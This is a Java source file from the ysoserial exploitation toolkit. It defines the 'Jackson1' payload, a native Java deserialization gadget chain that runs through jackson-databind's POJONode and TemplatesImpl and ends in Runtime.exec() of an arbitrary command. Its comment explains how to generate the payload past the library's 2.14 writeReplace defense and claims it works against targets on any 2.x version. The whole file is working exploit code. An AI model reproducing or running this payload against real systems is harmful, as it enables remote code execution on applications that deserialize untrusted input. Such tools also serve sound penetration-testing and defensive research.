package ysoserial.payloads;

import javax.management.BadAttributeValueExpException;

import com.fasterxml.jackson.databind.node.POJONode;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Jackson-databind gadget chain via POJONode.toString() in native Java deserialization.

	Discovered by @Y4tacker. Jackson-databind research pioneered by @mbechler (marshalsec).

	Gadget chain:
		ObjectInputStream.readObject()
			BadAttributeValueExpException.readObject()
				POJONode.toString()
					InternalNodeMapper.nodeToString()
						ObjectMapper.writeValueAsString()
							[getter invocation on wrapped POJO]
								TemplatesImpl.getOutputProperties()
									TemplatesImpl.newTransformer()
										defineClass() + newInstance()
											Runtime.exec()

	Why this matters:
		- jackson-databind is one of the most common Java dependencies
		- This is a NATIVE Java deserialization chain (ObjectInputStream), NOT Jackson JSON deser
		- BadAttributeValueExpException is a JMX class, rarely filtered
		- POJONode wraps any object and invokes all its getters via ObjectMapper on toString()
		- Works when SecurityManager is not set (default on all modern JDKs)
		- SecurityManager is deprecated since JDK 17 and removed in JDK 24

	Note: jackson-databind 2.14+ added writeReplace() to BaseJsonNode as defense.
	Use jackson-databind < 2.14 for payload GENERATION. The payload works on targets
	with any 2.x version because writeReplace is not called during deserialization.

	Requires:
		jackson-databind 2.x (< 2.14 for generation; any 2.x on target)
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.12.7.1"})
@Authors({ Authors.Y4TACKER, Authors.MBECHLER })
public class Jackson1 extends PayloadRunner implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		Object templatesImpl = Gadgets.createTemplatesImpl(command);

		POJONode pojoNode = new POJONode(templatesImpl);

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(val, "val", pojoNode);

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jackson1.class, args);
	}
}
